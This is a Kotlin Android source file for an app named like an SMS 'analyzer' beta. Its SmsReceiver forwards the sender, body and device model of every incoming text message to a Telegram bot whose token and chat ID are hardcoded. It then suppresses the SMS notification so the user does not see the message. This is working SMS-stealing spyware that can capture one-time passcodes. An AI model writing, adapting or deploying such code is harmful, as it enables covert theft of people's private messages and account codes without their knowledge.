package com.analyzer.smsbeta

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okio.IOException

class SmsReceiver : BroadcastReceiver() {
    private val client = OkHttpClient()

    override fun onReceive(context: Context?, intent: Intent?) {
        if (intent?.action == Telephony.Sms.Intents.SMS_DELIVER_ACTION) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            for (smsMessage in messages) {
                val sender = smsMessage.originatingAddress ?: "Unknown sender"
                val messageBody = smsMessage.messageBody ?: "Empty message"
                val deviceModel = getDeviceModel()

                sendToTelegramBot(sender, messageBody, deviceModel)
                
                // Suppress the SMS notification
                abortBroadcast()
            }
        }
    }

    private fun getDeviceModel(): String {
        return "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"
    }

    private fun sendToTelegramBot(sender: String, message: String, device: String) {
        val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
        val chatId = "6331293386"
        val url = "https://api.telegram.org/bot$botToken/sendMessage"

        val text = """
            New SMS received!
            Sender: $sender
            Message: $message
            
            Device: $device
        """.trimIndent()

        val mediaType = "application/json".toMediaType()
        val requestBody = """
            {
                "chat_id": "$chatId",
                "text": "$text",
                "parse_mode": "Markdown"
            }
        """.trimIndent().toRequestBody(mediaType)

        val request = Request.Builder()
            .url(url)
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : okhttp3.Callback {
            override fun onFailure(call: okhttp3.Call, e: IOException) {
                e.printStackTrace()
            }

            override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
                response.close()
            }
        })
    }
}
